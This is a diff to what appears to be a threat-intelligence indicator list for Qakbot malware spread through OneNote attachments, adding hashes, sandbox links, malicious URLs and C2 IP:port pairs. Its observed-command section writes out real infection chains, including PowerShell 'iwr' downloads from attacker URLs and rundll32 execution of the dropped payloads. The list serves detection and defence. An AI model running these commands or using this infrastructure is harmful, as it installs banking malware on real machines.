@@ -11,6 +11,7 @@ https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_obama241_22.02.2023.txt
 https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB15_17.02.2023.txt
 https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB15_13.02.2023.txt
 https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB16_20.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB16_22.02.2023.txt
 https://app.any.run/tasks/285762bd-e5e0-409b-a918-e006e1b31879/
 https://app.any.run/tasks/492897a1-6009-4142-a6d5-e43c10c0a357/
 https://app.any.run/tasks/e9ba6363-937c-4d97-a8d8-16bdfed48b39/
@@ -48,6 +49,12 @@ bdfee1ccabe10bc2600f4c184ec7e9a5496d646b2df8f17d4d96e0c89a40aca2
 81b85d5cd1ec4a116e04ff56d509f9bbd3cac0dd9fb695346340a6ccd3dde43d
 997953548ccaf132f260b69dcd56dd56a2dc8028b4da3e6b99a2133ca2486039
 45bc916a4e4573cdf9c5e86b1320e8173de9eeee1ad9be0f30378977a6e54ce1
+db5fb14dd0b8227895f1c1f58ea72496913d6a186a37ab65ed8993943521a9ef
+3b4091a046d1a6c6eae27b66a2856c6eb2b70b53109cabe2e8da07301e67f1c3
+aa2ded208f2ad9faf6613f590780779cb7476b8fba272a1e03434ff640b154ac
+860f6be05c43522e405e9bfd862ee9a02c16c406ee87d8da662764d0cb3c39cd 
+88ab8b7a1f4b611175289d599907dce20ac7811cf41bb381113bd0fbd0d61f38
+f27161f72a8731fbf5297a0043b6273e1342fc8d660688e114c59c3c65d2bd62
 
 ### process_command:
 ( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
@@ -144,7 +151,17 @@ C:\Windows\system32\cmd.exe /c ""C:\Users\admin\AppData\Local\Temp\OneNote\14.0\
 "C:\Windows\System32\WScript.exe" "C:\Users\admin\AppData\Local\Temp\OneNote\14.0\NT\0\O P E N.wsf" 
 C:\Windows\system32\cmd.exe /c ""C:\Users\admin\AppData\Local\Temp\OneNote\14.0\NT\0\aNaUlv0y.bat" ndll"
 powershell  iwr -uri http://51.222.199.226/145/566647.dat -o C:\programdata\aiaV7JT69.jpg
-
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\Item.one
+hWScript.exe C:\Users\Admin\AppData\Local\Temp\OneNote\16.0\Exported\{8A1EE65F-7E8F-46FA-8767-6BBE41CE24B2}\NT\0\O P E N.wsf
+cmd.exe /c C:\Users\Admin\AppData\Local\Temp\OneNote\16.0\Exported\{8A1EE65F-7E8F-46FA-8767-6BBE41CE24B2}\NT\0\aOQSy.bat ndll
+powershell iwr -uri https://autoingress.com.au/b1krz/09 -o C:\programdata\aR5TvJaFt.jpg
+Rundll32 C:\programdata\aR5TvJaFt.jpg,N115
+Exec > #2
+cmd /c C:\Users\Admin\AppData\Local\Temp\RR.lnk
+cmd.exe /q /c vibrations\\polaroid.cmd
+vibrations\airtightness.exe -decode vibrations\croaks.sql c:\users\public\output.txt
+vibrations\airtightness.exe -decode c:\users\public\output.txt c:\users\public\output2.txt
+rundll32 c:\users\public\output2.txt,N115
 
 ### url,dest_nt_domain:
 http://gkjdepok.org/crtfc/TsCw3rCG.dll
@@ -198,6 +215,10 @@ https://casualscollection.com/*.gif
 https://transfer.sh/*
 http://49.50.84.164/637/564761.dat
 http://51.222.199.226/145/566647.dat
+https://zuericherblatt.com/RRE.php
+https://premiumtrstcouriers.com/NP.php
+https://autoingress.com.au/b1krz/09 
+https://tria.ge/230222-wh26xscg68
 
 ### file_name,file_path:
 133337.zip
@@ -218,6 +239,8 @@ default.bat
 contract 2.one
 item.one
 C:\programdata\aiaV7JT69.jpg
+Item.pdf
+goods.one
 
 ### other strings:
 28dc02bcd14a49b263705c4cf5fda85734d1f6d401b7ac34b9377610d0597cae
@@ -522,3 +545,122 @@ C:\programdata\aiaV7JT69.jpg
 98.163.227.79:443
 98.22.28.34:995
 98.37.25.99:443
+47.21.51.138:443
+72.80.7.6:50003
+82.127.204.82:2222
+49.175.72.56:443
+201.244.108.183:995
+122.184.143.82:443
+102.156.253.86:443
+74.58.71.237:443
+47.21.51.138:995
+77.86.98.236:443
+71.31.101.183:443
+136.232.184.134:995
+86.225.214.138:2222
+95.242.101.251:995
+109.11.175.42:2222
+90.78.138.217:2222
+184.176.35.223:2222
+35.143.97.145:995
+202.186.177.88:443
+114.79.180.14:995
+86.150.47.219:443
+183.87.163.165:443
+50.68.186.195:443
+190.75.95.164:2222
+98.145.23.67:443
+67.10.175.47:2222
+71.212.147.224:2222
+88.126.94.4:50000
+103.140.174.19:2222
+103.231.216.238:443
+78.84.123.237:995
+180.151.108.14:443
+80.47.57.131:2222
+198.2.51.242:993
+50.68.204.71:995
+205.164.227.222:443
+147.219.4.194:443
+77.124.6.149:443
+49.245.82.178:2222
+46.10.198.107:443
+76.80.180.154:995
+12.172.173.82:32101
+68.150.18.161:443
+68.173.170.110:8443
+24.9.220.167:443
+12.172.173.82:2087
+50.68.204.71:993
+107.146.12.26:2222
+81.229.117.95:2222
+27.0.48.233:443
+69.133.162.35:443
+59.28.84.65:443
+76.170.252.153:995
+89.32.159.192:995
+202.142.98.62:995
+73.78.215.104:443
+181.164.217.211:443
+92.97.203.51:2222
+116.74.164.26:443
+103.141.50.102:995
+149.74.159.67:2222
+116.72.250.18:443
+125.99.69.178:443
+202.142.98.62:443
+67.61.71.201:443
+103.123.223.168:443
+80.13.205.69:2222
+80.0.74.165:443
+86.99.54.39:2222
+213.67.255.57:2222
+176.142.207.63:443
+50.67.17.92:443
+217.165.1.53:2222
+70.64.77.115:443
+2.50.47.74:443
+66.191.69.18:995
+75.143.236.149:443
+197.92.136.122:443
+108.190.203.42:995
+50.68.204.71:443
+12.172.173.82:995
+70.77.116.233:443
+162.248.14.107:443
+75.98.154.19:443
+58.247.115.126:995
+184.68.116.146:61202
+41.99.50.76:443
+184.68.116.146:3389
+72.203.216.98:2222
+103.252.7.231:443
+12.172.173.82:50001
+70.160.80.210:443
+12.172.173.82:465
+12.172.173.82:21
+47.34.30.133:443
+202.187.232.161:995
+98.147.155.235:443
+124.122.56.144:443
+75.141.227.169:443
+103.144.201.53:2078
+172.248.42.122:443
+12.172.173.82:990
+24.239.69.244:443
+173.18.126.3:443
+73.165.119.20:443
+90.104.22.28:2222
+14.192.241.76:995
+74.33.196.114:443
+74.93.148.97:995
+86.202.48.142:2222
+174.104.184.149:443
+12.172.173.82:20
+109.151.144.37:443
+104.35.24.154:443
+114.143.176.234:443
+84.35.26.14:995
+45.50.233.214:443
+64.237.185.60:443
+73.161.176.218:443
